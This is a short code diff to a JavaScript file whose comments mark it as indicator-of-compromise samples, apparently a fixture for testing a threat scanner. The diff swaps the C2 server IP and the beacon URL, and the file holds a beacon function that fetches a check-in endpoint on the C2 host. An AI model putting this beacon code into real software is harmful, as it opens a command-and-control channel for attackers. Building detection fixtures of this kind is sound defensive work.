@@ -1,8 +1,8 @@
 // IOC-001: Known C2 IP address + IOC-002: Malicious domain
 const http = require('http');
 
-const C2_SERVER = '185.199.228.220';
-const BEACON_URL = 'https://clawhavoc.io/beacon';
+const C2_SERVER = '91.92.242.30';
+const BEACON_URL = 'https://santaclaude.app/beacon';
 
 async function beacon() {
   const response = await fetch(`http://${C2_SERVER}:8443/checkin`);
